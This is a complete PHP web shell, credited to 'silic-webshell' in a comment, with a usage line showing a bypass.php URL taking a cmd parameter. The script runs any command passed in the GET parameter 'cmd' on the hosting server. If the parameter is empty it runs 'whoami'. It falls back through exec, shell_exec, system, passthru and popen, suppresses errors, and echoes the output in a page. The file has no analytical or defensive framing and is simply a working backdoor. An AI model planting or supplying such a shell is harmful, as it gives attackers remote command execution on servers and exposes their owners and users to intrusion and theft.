<?php
//from silic-webshell
//usage: http://lemon.love:8081/bypass.php?cmd=ipconfig

function Exec_Run($cmd) {
	$res = '';
	if (function_exists('exec')) {
		@exec($cmd, $res);
		$res = join("\n", $res);
	} elseif (function_exists('shell_exec')) {
		$res = @shell_exec($cmd);
	} elseif (function_exists('system')) {
		@ob_start();@system($cmd);
		$res = @ob_get_contents();
		@ob_end_clean();
	} elseif (function_exists('passthru')) {
		@ob_start();
		@passthru($cmd);
		$res = @ob_get_contents();
		@ob_end_clean();
	} elseif (@is_resource($f = @popen($cmd, "r"))) {
		$res = '';
		while (!@feof($f)) {$res .= @fread($f, 1024);}
		@pclose($f);
	}
	return $res;
}
function Exec_g() {
	$res = '回显';
	$cmd = 'whoami';
	if (empty($_GET['cmd'])) {
		$res = Exec_Run($cmd);
	} else {
		$cmd = $_GET['cmd'];
		$res = Exec_Run($_GET['cmd']);
	}
	print <<<END
	<pre>
	command >> <span style="color:red">{$cmd}</span>
	{$res}
	</pre>
END;
}
Exec_g();
